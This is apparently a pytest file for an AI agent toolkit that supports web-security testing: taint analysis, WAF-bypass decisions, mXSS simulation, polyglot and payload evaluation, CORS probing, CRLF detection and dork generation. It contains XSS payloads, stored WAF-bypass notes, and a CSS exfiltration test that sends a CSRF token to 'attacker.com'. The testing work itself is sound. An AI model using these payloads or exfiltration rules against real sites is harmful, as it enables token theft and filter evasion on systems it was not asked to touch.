"""Agent tool layer — registry, safe dispatch, memory, anti-thrashing, domain wrappers."""
from analysis_engine.agent_tools import AgentMemory, AgentToolkit, AntiThrasher


# ------------------------------------------------------------------- registry

def test_schemas_are_function_calling_shaped():
    tk = AgentToolkit(allow_network=False)
    schemas = tk.schemas()
    names = {s["function"]["name"] for s in schemas}
    assert {"taint_analyze", "decide_bypass", "web_search", "fetch_url", "remember", "recall"} <= names
    for s in schemas:
        assert s["type"] == "function"
        assert "parameters" in s["function"] and s["function"]["parameters"]["type"] == "object"
    # The footguns are deliberately absent.
    assert "run_command" not in names and "run_python" not in names


def test_unknown_tool_is_reported_not_crashed():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("delete_everything", {})
    assert r["ok"] is False and "unknown tool" in r["error"]


# ------------------------------------------------------------------- domain tools

def test_taint_analyze_tool_finds_reachable_param():
    tk = AgentToolkit(allow_network=False)
    js = "var q = new URLSearchParams(location.search).get('q'); el.innerHTML = q;"
    r = tk.call("taint_analyze", {"js_code": js})
    assert r["ok"] and r["result"]
    assert r["result"][0]["source_param"] == "q"


def test_decide_bypass_tool_skips_proven_dead_context():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("decide_bypass", {"context": "HTML_TEXT", "blocked_chars": ["<"]})
    assert r["ok"] and r["result"]["decision"] == "skip"

    r2 = tk.call("decide_bypass", {"context": "HTML_TEXT", "blocked_tokens": ["script"]})
    assert r2["result"]["decision"] == "fire_witness" and r2["result"]["witness"]


# ------------------------------------------------------------------- memory

def test_memory_recall_ranks_by_relevance(tmp_path):
    mem = AgentMemory(str(tmp_path / "mem.json"))
    mem.save("akamai-bypass", "Akamai on acme strips < and > but allows svg and onload", ["waf", "akamai"])
    mem.save("cloudflare-note", "Cloudflare on bravo blocks onerror, use onpointerover", ["waf"])
    hits = mem.recall("how to bypass akamai svg")
    assert hits and hits[0]["title"] == "akamai-bypass"


def test_memory_persists_across_instances(tmp_path):
    p = str(tmp_path / "m.json")
    AgentMemory(p).save("k", "remember this fact about onload handlers", ["x"])
    # New instance loads from disk (survives a restart).
    assert AgentMemory(p).recall("onload")[0]["title"] == "k"


def test_memory_tools_via_toolkit(tmp_path):
    tk = AgentToolkit(memory=AgentMemory(str(tmp_path / "t.json")), allow_network=False)
    assert tk.call("remember", {"title": "f", "content": "backtick survives the filter"})["ok"]
    r = tk.call("recall", {"query": "backtick"})
    assert r["ok"] and r["result"][0]["title"] == "f"


# ------------------------------------------------------------------- anti-thrash

def test_anti_thrasher_blocks_repeated_identical_failures():
    at = AntiThrasher(max_identical_failures=2)
    assert at.record("fetch_url", {"url": "x"}, ok=False, error="boom") == (False, "")
    blocked, msg = at.record("fetch_url", {"url": "x"}, ok=False, error="boom")
    assert blocked is True and "blocked" in msg
    # A success resets the counter.
    at.record("fetch_url", {"url": "x"}, ok=True)
    assert at.record("fetch_url", {"url": "x"}, ok=False, error="boom")[0] is False


def test_toolkit_surfaces_thrash_steer_on_repeat():
    tk = AgentToolkit(allow_network=False)
    # fetch_url with network disabled returns a note (ok), so force a failure via bad url twice.
    tk.call("fetch_url", {"url": "not-a-url"})
    r = tk.call("fetch_url", {"url": "not-a-url"})
    assert r["ok"] is False and r.get("blocked") is True


# ------------------------------------------------------------------- research safety

def test_research_tools_degrade_without_network():
    tk = AgentToolkit(allow_network=False)
    assert tk.call("web_search", {"query": "xss"})["result"]["results"] == []
    assert tk.call("fetch_url", {"url": "https://example.com"})["result"]["status"] == 0


def test_fetch_url_rejects_non_absolute():
    tk = AgentToolkit(allow_network=True)
    r = tk.call("fetch_url", {"url": "ftp://x"})
    assert r["ok"] is False and "absolute" in r["error"]


def test_classify_context_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("classify_context", {"html": "<input value='CANARY'>", "reflection_token": "CANARY"})
    assert r["ok"] is True
    assert "ATTR" in r["result"]["context_type"]
    assert r["result"]["count"] == 1


def test_simulate_mxss_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("simulate_mxss", {"dirty_html": "<math><mtext><table><mglyph><style></math><img src=x onerror=1>"})
    assert r["ok"] is True
    assert "mutation_score" in r["result"]


def test_generate_polyglot_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("generate_polyglot", {"token": "MY_TEST_TOKEN"})
    assert r["ok"] is True
    assert "MY_TEST_TOKEN" in r["result"]["universal_polyglot"]

    r_set = tk.call("generate_polyglot", {"token": "MY_TEST_TOKEN", "triage_set": True})
    assert r_set["ok"] is True
    assert len(r_set["result"]["polyglots"]) >= 3


def test_evaluate_payload_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("evaluate_payload", {
        "payload": "<script>alert('XSS')</script>",
        "blocked_tokens": ["script"],
        "blocked_chars": ["'"],
    })
    assert r["ok"] is True
    assert r["result"]["survived_intact"] is False
    assert "'" in r["result"]["stripped_characters"]


def test_ledger_coverage_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("ledger_coverage", {"limit": 5})
    assert r["ok"] is True
    assert "decided_fraction" in r["result"]
    assert "gaps_to_close" in r["result"]


def test_query_pdf_intel_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("query_pdf_intel", {"query": "waf", "limit": 2})
    assert r["ok"] is True
    assert r["result"]["results_count"] > 0
    assert "filename" in r["result"]["results"][0]


def test_audit_cors_config_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("audit_cors_config", {"target_url": "https://example.com/api/data"})
    assert r["ok"] is True
    assert len(r["result"]["probed_vectors"]) >= 5
    assert any(v["vector"] == "null_origin" for v in r["result"]["probed_vectors"])


def test_generate_css_exfil_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("generate_css_exfil", {
        "target_selector": "input[name='csrf']",
        "target_attribute": "value",
        "exfil_url": "https://attacker.com/leak",
    })
    assert r["ok"] is True
    assert r["result"]["total_rules_generated"] > 0
    assert "input[name='csrf']" in r["result"]["full_css_payload"]


def test_analyze_crlf_injection_tool():
    tk = AgentToolkit(allow_network=False)
    r_vuln = tk.call("analyze_crlf_injection", {"header_value": "test%0d%0aSet-Cookie:secret=1"})
    assert r_vuln["ok"] is True
    assert r_vuln["result"]["crlf_detected"] is True

    r_clean = tk.call("analyze_crlf_injection", {"header_value": "standard-header-value"})
    assert r_clean["ok"] is True
    assert r_clean["result"]["crlf_detected"] is False


def test_generate_target_dorks_tool():
    tk = AgentToolkit(allow_network=False)
    r = tk.call("generate_target_dorks", {"domain": "hackerone.com"})
    assert r["ok"] is True
    assert r["result"]["total_dorks"] >= 5
    assert any("site:hackerone.com" in d["dork"] for d in r["result"]["dorks"])



